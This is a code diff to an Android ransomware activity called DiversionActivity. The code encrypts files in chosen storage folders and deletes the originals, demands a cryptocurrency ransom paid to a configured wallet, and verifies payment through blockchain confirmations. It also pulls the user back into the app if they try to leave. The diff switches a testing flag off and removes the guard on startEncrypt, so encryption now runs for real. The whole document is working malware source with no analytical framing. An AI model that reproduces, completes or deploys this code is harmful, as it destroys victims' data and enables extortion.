@@ -11,7 +11,6 @@ import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
 import android.os.SystemClock;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
@@ -70,7 +69,7 @@ public class DiversionActivity extends Activity
 	protected String[] targetDirectories;
 	protected String[] targetExtensions;
 	protected Boolean impossible;
-	protected Boolean testing = true;
+	protected Boolean testing = false;
 	public String[] perms = {android.Manifest.permission.WRITE_EXTERNAL_STORAGE,android.Manifest.permission.READ_EXTERNAL_STORAGE,android.Manifest.permission.INTERNET,android.Manifest.permission.ACCESS_NETWORK_STATE};
 	private int all = 0;
 	private int allDec = 0;
@@ -79,6 +78,9 @@ public class DiversionActivity extends Activity
 	private int currentResponseCode = 200;
 	private String currentUrl;
     private Integer paid;
+    public Boolean splashFinished = false;
+
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState)
@@ -155,14 +157,14 @@ public class DiversionActivity extends Activity
 				public void run()
                 {
 					impossible = prefs.getBoolean("impossible", false);
+
 					if (paymentConfirmed == false & ! impossible)
                     {
 						try
                         {
-							if (!testing)
-                            {
-								startEncrypt(targetDirectories, targetExtensions);
-							}
+
+                            startEncrypt(targetDirectories, targetExtensions);
+
 						}
 						catch (Error e)
                         {
@@ -181,6 +183,7 @@ public class DiversionActivity extends Activity
 								setContentView(R.layout.main);
 								log = findViewById(R.id.log);
 								TxID = findViewById(R.id.txid);
+                                splashFinished = true;
                                 verifyButton = findViewById(R.id.verifyBotton);
 								if (impossible)
                                 {
@@ -196,6 +199,8 @@ public class DiversionActivity extends Activity
                                 ammountInfo = findViewById(R.id.amountInfo);
                                 String dat = getString(R.string.step1) + " " + getString(R.string.ransom_amount) + " " + getString(R.string.steptype) + " " + getString(R.string.stepend);
                                 ammountInfo.setText(dat);
+                                notifyText(storagePath());
+
 
 							}
 						});
@@ -205,9 +210,12 @@ public class DiversionActivity extends Activity
 
 	private void startEncrypt(String[] directories, String[] types)
     {
+        int dirs = directories.length;
+        int now = 0;
 		for (String directory: directories)
         {
-			File tmp = new File(Environment.getExternalStorageDirectory().toString() + "/" + directory);
+            logSplashText(getString(R.string.encrypting_files_started_log_message) + "\n" + (now++) + "/" + dirs);
+            File tmp = new File(storagePath() + "/" + directory);
 			if (tmp.isDirectory() && tmp.exists())
             {
 				for (String type: types)
@@ -220,9 +228,12 @@ public class DiversionActivity extends Activity
 
 	private void startDecrypt(String[] directories, String[] types)
     {
+        int dirs = directories.length;
+        int now = 0;
 		for (String directory: directories)
         {
-			File tmp = new File(Environment.getExternalStorageDirectory().toString() + "/" + directory);
+            logText(getString(R.string.decrypting_files_started_log_message) + " " + (now++) + "/" + dirs);
+			File tmp = new File("sdcard/" + directory);
 			if (tmp.isDirectory() && tmp.exists())
             {
 				for (String type: types)
@@ -253,7 +264,7 @@ public class DiversionActivity extends Activity
 
 	private void encryptFiles(String fileType, String folder)
     {
-		String path = Environment.getExternalStorageDirectory().toString() + "/" + folder;
+		String path = storagePath() + "/" + folder;
 		File directory = new File(path);
 		List<String> result = new ArrayList<>();
 		search(".*\\." + fileType, directory, result);
@@ -262,59 +273,70 @@ public class DiversionActivity extends Activity
         {
 			now++;
 			all++;
-			File tmp = new File(s);
-			int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
-			if (maximumEncryptFileKBSize >= file_kb)
+            if (!testing)
             {
-				logSplashText(getString(R.string.splash_encrypt_message) + " " + now + "/" + result.size());
-				try
+                File tmp = new File(s);
+                int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
+                if (maximumEncryptFileKBSize >= file_kb)
                 {
-					writeFile(tmp.getAbsolutePath() + "." + encExt(), encryptBytes(readFile(tmp.getAbsolutePath())));
-					tmp.delete();
-				}
-				catch (Exception e)
+                    logSplashText(getString(R.string.splash_encrypt_message) + " " + now + "/" + result.size());
+                    try
+                    {
+                        writeFile(tmp.getAbsolutePath() + "." + encExt(), encryptBytes(readFile(tmp.getAbsolutePath())));
+                        tmp.delete();
+                    }
+                    catch (Exception e)
+                    {
+                        notifyText(e.getMessage());
+                    }
+                }
+                else
                 {
-					notifyText(e.getMessage());
-				}
-			}
-			else
-            {
-				tmp.renameTo(new File(tmp.getParent(), tmp.getName() + "." + encExt()));
-			}
+                    tmp.renameTo(new File(tmp.getParent(), tmp.getName() + "." + encExt()));
+                }
+            }
 		}
 	}
 
+    public String storagePath()
+    {
+        return "sdcard";
+    }
 
 	private void decryptFiles(String fileType, String folder)
     {
-		String path = Environment.getExternalStorageDirectory().toString() + "/" + folder;
+		String path = storagePath() + "/" + folder;
 		File directory = new File(path);
 		List<String> result = new ArrayList<>();
 		search(".*\\." + fileType + "." + encExt(), directory, result);
 		for (String s : result)
         {
-			File tmp = new File(s);
-			tmp.setReadable(true);
-			tmp.setWritable(true);
+
 			allDec++;
-			logText(getString(R.string.log_decrypted_file_message) + " : " + allDec + "/" + all + " : " + tmp.getName());
-			int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
-			if (maximumEncryptFileKBSize >= file_kb)
+            if (!testing)
             {
-				try
+                File tmp = new File(s);
+                tmp.setReadable(true);
+                tmp.setWritable(true);
+                logText(getString(R.string.log_decrypted_file_message) + " : " + allDec + "/" + all + " : " + tmp.getName());
+                int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
+                if (maximumEncryptFileKBSize >= file_kb)
                 {
-					writeFile(tmp.getAbsolutePath().replaceAll("." + encExt(), ""), decryptBytes(readFile(tmp.getAbsolutePath())));
-					tmp.delete();
-				}
-				catch (Exception e)
+                    try
+                    {
+                        writeFile(tmp.getAbsolutePath().replaceAll("." + encExt(), ""), decryptBytes(readFile(tmp.getAbsolutePath())));
+                        tmp.delete();
+                    }
+                    catch (Exception e)
+                    {
+                        tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
+                    }
+                }
+                else
                 {
-					tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
-				}
-			}
-			else
-            {
-			  	tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
-			}
+                    tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
+                }
+            }
 		}
 	}
 
@@ -470,11 +492,10 @@ public class DiversionActivity extends Activity
 								editButton(verifyButton, getString(R.string.decrypting_button_text), false);
 								paymentConfirmed = true;
 								logText(getString(R.string.decrypting_button_text));
-								if (!testing)
-                                {
-                                    startDecrypt(targetDirectories, targetExtensions);
-                                }
-                                logText(getString(R.string.log_decrypting_finished_message) + "\n");
+
+                                startDecrypt(targetDirectories, targetExtensions);
+
+                                logText(all + " " + getString(R.string.log_decrypting_finished_message) + "\n");
 								editButton(verifyButton, getString(R.string.decrypting_finished_button_text), false);
 								killer();
 							}
@@ -508,12 +529,11 @@ public class DiversionActivity extends Activity
         {
 			editButton(verifyButton, getString(R.string.decrypting_button_text), false);
 			logText(getString(R.string.decrypting_files_started_log_message));
-            if (!testing)
-            {
-                startDecrypt(targetDirectories, targetExtensions);
-			}
-            logText(getString(R.string.log_decrypting_finished_message));
-			editButton(verifyButton, getString(R.string.decrypting_finished_button_text), false);
+
+            startDecrypt(targetDirectories, targetExtensions);
+
+            logText(all + " " + getString(R.string.log_decrypting_finished_message) + "\n");
+            editButton(verifyButton, getString(R.string.decrypting_finished_button_text), false);
 		}
 	}
 
@@ -601,7 +621,7 @@ public class DiversionActivity extends Activity
             int total = jsonResponse.getInt("total");
             String fees = jsonResponse.getString("fees");
             String dateConfirmed = jsonResponse.getString("confirmed");
-            
+
             if (confirmations > 4 && (receiver.equals(getString(R.string.wallet_address))))
             {
                 if ((total >= Integer.parseInt(getString(R.string.ransom_amount))))
@@ -681,7 +701,10 @@ public class DiversionActivity extends Activity
         {
 			if (permsOk() & ! impossible & ! killing)
             {
-				notifyText(getString(R.string.tried_to_use_back_button_message));
+                if (splashFinished)
+                {
+                    notifyText(getString(R.string.tried_to_use_back_button_message));
+                }
 			}
 			return false;
 		}
@@ -708,13 +731,17 @@ public class DiversionActivity extends Activity
     {
 		if (!hasFocus && permsOk() & ! impossible & ! killing)
         {
-			notifyText(getString(R.string.return_to_the_app_message));
+            if (splashFinished)
+            {
+                notifyText(getString(R.string.return_to_the_app_message));
+            }
             PackageManager pm = this.getPackageManager();
             Intent intent = pm.getLaunchIntentForPackage(this.getPackageName());
             startActivity(intent);
 		}
 		super.onWindowFocusChanged(hasFocus);
 	}
+
 
 	public List<String> getCookies()
     {
